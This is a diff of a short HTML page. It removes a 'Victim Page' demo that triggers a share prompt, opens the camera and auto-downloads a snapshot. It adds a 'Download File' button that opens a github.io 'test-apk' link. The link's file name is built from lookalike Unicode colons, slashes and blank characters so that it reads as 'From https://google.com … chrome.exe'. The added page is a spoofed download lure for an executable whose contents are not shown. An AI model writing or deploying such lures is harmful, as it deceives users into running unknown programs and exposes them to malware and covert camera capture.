@@ -1,67 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Victim Page</title>
+<meta charset="utf-8">
 <style>
-  body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-  video { width: 320px; height: 240px; background: black; border-radius: 12px; margin-top: 20px; }
-  button { padding: 12px 25px; font-size: 16px; margin-top: 20px; }
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  font-size: 16px;
+  cursor: pointer;
+}
 </style>
 </head>
 <body>
 
-<h2>Victim Page</h2>
-<video id="video" autoplay playsinline muted></video>
-<br>
-<button id="actionBtn">Share & Start Camera</button>
-
 <script>
-const video = document.getElementById("video");
-const btn = document.getElementById("actionBtn");
-
-btn.onclick = async () => {
-  try {
-    // 1️⃣ Web Share API
-    if (navigator.share) {
-      await navigator.share({
-        title: "WebShare + Camera",
-        text: "Share dulu sebelum kamera aktif",
-        url: location.href
-      });
-    } else {
-      alert("Web Share API not supported");
-    }
-
-    // 2️⃣ Start camera
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-
-    // 3️⃣ Tunggu sebentar supaya video ready
-    await new Promise(res => setTimeout(res, 500));
-
-    // 4️⃣ Auto-capture snapshot dan simpan di Victim
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 320;
-    canvas.height = video.videoHeight || 240;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Buat link download otomatis
-    const link = document.createElement("a");
-    link.href = canvas.toDataURL("image/png");
-    link.download = "snapshot.png";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-
-    console.log("Snapshot captured and saved!");
-
-  } catch (err) {
-    console.error("Error:", err);
-  }
-};
+function a(){
+    window.open('https://ecdnts-del.github.io/test-apk/From%20https%E2%88%B6%E2%A7%B8%E2%A7%B8google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe', '_blank');
+}
 </script>
+
+<center>
+<input type="button" 
+       class="button" 
+       value="Download File" 
+       onclick="a()">
+</center>
 
 </body>
 </html>
